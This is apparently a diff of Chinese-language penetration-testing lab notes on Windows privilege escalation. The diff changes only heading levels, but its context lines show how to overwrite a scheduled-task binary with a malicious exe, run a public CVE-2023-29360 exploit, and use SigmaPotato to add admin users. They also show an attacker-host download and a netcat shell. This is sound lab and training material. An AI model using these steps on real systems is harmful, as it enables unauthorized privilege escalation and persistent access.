@@ -1947,7 +1947,7 @@ Start Date:                           7/4/2022
 找到`\Microsoft\CacheCleanup` 由 daveadmin 創建\
 條件: 在steve的 Pictures 主目錄中執行 BackendCacheCleanup.exe。且根據 Last Run Time 與 Next Run Time 可以猜測該任務每分鐘執行一次，執行身份以 daveadmin 運行。
 
-### 2. 查看指定 Task 權限
+#### 2. 查看指定 Task 權限
 ```
 PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
 C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
@@ -1957,7 +1957,7 @@ C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
 ```
 > 擁有所有存取權限（F）
 
-### 3. 利用 Malicious exe 將原始 Task 覆蓋
+#### 3. 利用 Malicious exe 將原始 Task 覆蓋
 可以使用上方 [Service Binary Hijacking](#Service-Binary-Hijacking) 編譯好的 adduser.exe 
 ```
 ┌──(chw㉿CHW)-[~]
@@ -1971,7 +1971,7 @@ PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
 ```
 > 成功利用 Malicious exe 覆蓋 BackendCacheCleanup.exe
 
-### 4. 驗證提權結果
+#### 4. 驗證提權結果
 ```
 PS C:\Users\steve> net user
 
@@ -2000,14 +2000,14 @@ The command completed successfully.
 ```
 > 新增 user dave2 ，代表 Malicious exe 成功執行
 
-## Using Exploits
+### Using Exploits
 兩種不同類型的提權漏洞:
 - application-based vulnerabilities
 在 [Locating Public Exploits](https://hackmd.io/@CHW/ryj8tW4UJl#Locating-Public-Exploits) 中提到的，Windows 系統上安裝的應用程式可能包含不同類型的漏洞，透過執行 administrative permissions 的應用程式漏洞。
 - Windows Kernel
 [Windows Kernel](https://en.wikipedia.org/wiki/Architecture_of_Windows_NT) 需要對 Windows 作業系統有深入了解
 
-### 1. 查看使用者權限
+#### 1. 查看使用者權限
 ```
 ┌──(chw㉿CHW)-[~]
 └─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.175.220
@@ -2029,7 +2029,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 ```
 > 沒有任何特殊權限
 
-### 2. 查看系統版本 與 patches installed 
+#### 2. 查看系統版本 與 patches installed 
 ```
 PS C:\Users\steve> systeminfo
 
@@ -2053,7 +2053,7 @@ Source        Description      HotFixID      InstalledBy          InstalledOn
 可以查看 [Microsoft Security Response Center](https://msrc.microsoft.com/) 的 Security vulnerabilities\
 其中 [CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release) 提供了 exploit code 和  pre-compiled version exploit 。在漏洞的官方網站 MSRC，[微軟應該會根據漏洞提供 patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360)，patch 編號為 KB5027215，但我們在目標機器上沒有看到 (代表未修補)。
 
-### 3. 嘗試使用 public exploit
+#### 3. 嘗試使用 public exploit
 ```
 PS C:\Users\steve\Desktop> whoami
 clientwk220\steve
@@ -2089,9 +2089,9 @@ nt authority\system
 >> 專門利用 `SeImpersonatePrivilege` 來進行權限提升。\
 透過 Named Pipe 來誘導 NT AUTHORITY\SYSTEM 連線，最終讓攻擊者執行高權限命令或獲取 SYSTEM shell。
 
-## SigmaPotato
+### SigmaPotato
 以下範例利用 SigmaPotato 提權
-### 1. 查看使用者權限
+#### 1. 查看使用者權限
 ```
 ┌──(chw㉿CHW)-[~]
 └─$ nc 192.168.175.220 4444
@@ -2116,7 +2116,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
 > dave 擁有 `SeImpersonatePrivilege` 權限
 
-### 2. 嘗試使用 PrintSpoofer 提權
+#### 2. 嘗試使用 PrintSpoofer 提權
 ```
 ┌──(chw㉿CHW)-[~/Tools/SigmaPotato]
 └─$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
@@ -2132,7 +2132,7 @@ Windows PowerShell
 PS C:\Users\dave> iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
 iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
 ```
-### 3. 執行 SigmaPotato
+#### 3. 執行 SigmaPotato
 利用 SigmaPotato 提權，並新增一個 Administrator: dave4
 ```
 PS C:\Users\dave> .\SigmaPotato "net user dave4 lab /add"
